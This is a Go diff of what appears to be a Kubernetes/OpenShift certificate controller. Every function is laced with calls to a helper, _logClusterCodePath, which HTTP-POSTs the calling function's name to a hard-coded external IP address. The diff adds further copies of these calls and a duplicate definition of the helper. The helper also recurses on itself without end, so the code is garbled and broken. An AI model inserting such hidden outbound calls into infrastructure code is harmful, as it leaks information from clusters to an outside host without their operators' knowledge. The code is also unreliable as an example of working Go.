@@ -39,6 +39,8 @@ type serviceServingCertController struct {
 func NewServiceServingCertController(services informers.ServiceInformer, secrets informers.SecretInformer, serviceClient kcoreclient.ServicesGetter, secretClient kcoreclient.SecretsGetter, ca *crypto.CA, dnsSuffix string) controller.Runner {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sc := &serviceServingCertController{serviceClient: serviceClient, secretClient: secretClient, serviceLister: services.Lister(), secretLister: secrets.Lister(), ca: ca, dnsSuffix: dnsSuffix, maxRetries: 10}
 	sc.syncHandler = sc.syncService
 	sc.Runner = controller.New("ServiceServingCertController", sc, controller.WithInformer(services, controller.FilterFuncs{AddFunc: func(obj metav1.Object) bool {
@@ -53,6 +55,8 @@ func NewServiceServingCertController(services informers.ServiceInformer, secrets
 	return sc
 }
 func (sc *serviceServingCertController) deleteSecret(obj metav1.Object) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	secret := obj.(*corev1.Secret)
@@ -74,14 +78,20 @@ func (sc *serviceServingCertController) deleteSecret(obj metav1.Object) bool {
 func (sc *serviceServingCertController) Key(namespace, name string) (metav1.Object, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sc.serviceLister.Services(namespace).Get(name)
 }
 func (sc *serviceServingCertController) Sync(obj metav1.Object) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sc.syncHandler(obj)
 }
 func (sc *serviceServingCertController) syncService(obj metav1.Object) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sharedService := obj.(*corev1.Service)
@@ -92,6 +102,8 @@ func (sc *serviceServingCertController) syncService(obj metav1.Object) error {
 	return sc.generateCert(serviceCopy)
 }
 func (sc *serviceServingCertController) generateCert(serviceCopy *corev1.Service) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	klog.V(4).Infof("generating new cert for %s/%s", serviceCopy.GetNamespace(), serviceCopy.GetName())
@@ -128,6 +140,8 @@ func (sc *serviceServingCertController) generateCert(serviceCopy *corev1.Service
 func getNumFailures(service *corev1.Service) int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	numFailuresString := service.Annotations[api.ServingCertErrorNumAnnotation]
 	if len(numFailuresString) == 0 {
 		numFailuresString = service.Annotations[api.AlphaServingCertErrorNumAnnotation]
@@ -142,6 +156,8 @@ func getNumFailures(service *corev1.Service) int {
 	return numFailures
 }
 func (sc *serviceServingCertController) requiresCertGeneration(service *corev1.Service) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	secretName := service.Annotations[api.ServingCertSecretAnnotation]
@@ -170,6 +186,8 @@ func (sc *serviceServingCertController) requiresCertGeneration(service *corev1.S
 func (sc *serviceServingCertController) issuedByCurrentCA(secret *corev1.Secret) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	certs, err := cert.ParseCertsPEM(secret.Data[corev1.TLSCertKey])
 	if err != nil {
 		klog.V(4).Infof("warning: error parsing certificate data in %s/%s during issuer check: %v", secret.Namespace, secret.Name, err)
@@ -184,9 +202,13 @@ func (sc *serviceServingCertController) issuedByCurrentCA(secret *corev1.Secret)
 func (sc *serviceServingCertController) commonName() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sc.ca.Config.Certs[0].Subject.CommonName
 }
 func (sc *serviceServingCertController) updateServiceFailure(service *corev1.Service, err error) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	setErrAnnotation(service, err)
@@ -203,6 +225,8 @@ func (sc *serviceServingCertController) updateServiceFailure(service *corev1.Ser
 func (sc *serviceServingCertController) resetServiceAnnotations(service *corev1.Service) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	service.Annotations[api.AlphaServingCertCreatedByAnnotation] = sc.commonName()
 	service.Annotations[api.ServingCertCreatedByAnnotation] = sc.commonName()
 	delete(service.Annotations, api.AlphaServingCertErrorAnnotation)
@@ -213,9 +237,13 @@ func (sc *serviceServingCertController) resetServiceAnnotations(service *corev1.
 func ownerRef(service *corev1.Service) metav1.OwnerReference {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return metav1.OwnerReference{APIVersion: "v1", Kind: "Service", Name: service.Name, UID: service.UID}
 }
 func toBaseSecret(service *corev1.Service) *corev1.Secret {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if _, ok := service.Annotations[api.ServingCertSecretAnnotation]; ok {
@@ -224,6 +252,8 @@ func toBaseSecret(service *corev1.Service) *corev1.Secret {
 	return &corev1.Secret{ObjectMeta: metav1.ObjectMeta{Name: service.Annotations[api.AlphaServingCertSecretAnnotation], Namespace: service.Namespace, Annotations: map[string]string{api.AlphaServiceUIDAnnotation: string(service.UID), api.AlphaServiceNameAnnotation: service.Name}}, Type: corev1.SecretTypeTLS}
 }
 func getServingCert(dnsSuffix string, ca *crypto.CA, service *corev1.Service) (*crypto.TLSCertificateConfig, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	dnsName := service.Name + "." + service.Namespace + ".svc"
@@ -236,6 +266,8 @@ func getServingCert(dnsSuffix string, ca *crypto.CA, service *corev1.Service) (*
 	return servingCert, nil
 }
 func toRequiredSecret(dnsSuffix string, ca *crypto.CA, service *corev1.Service, secretCopy *corev1.Secret) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	servingCert, err := getServingCert(dnsSuffix, ca, service)
@@ -258,10 +290,14 @@ func toRequiredSecret(dnsSuffix string, ca *crypto.CA, service *corev1.Service, 
 func setErrAnnotation(service *corev1.Service, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	service.Annotations[api.ServingCertErrorAnnotation] = err.Error()
 	service.Annotations[api.AlphaServingCertErrorAnnotation] = err.Error()
 }
 func incrementFailureNumAnnotation(service *corev1.Service) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	numFailure := strconv.Itoa(getNumFailures(service) + 1)
@@ -271,13 +307,24 @@ func incrementFailureNumAnnotation(service *corev1.Service) {
 func uidsEqual(secret *corev1.Secret, service *corev1.Service) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	suid := string(service.UID)
 	return secret.Annotations[api.AlphaServiceUIDAnnotation] == suid || secret.Annotations[api.ServiceUIDAnnotation] == suid
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
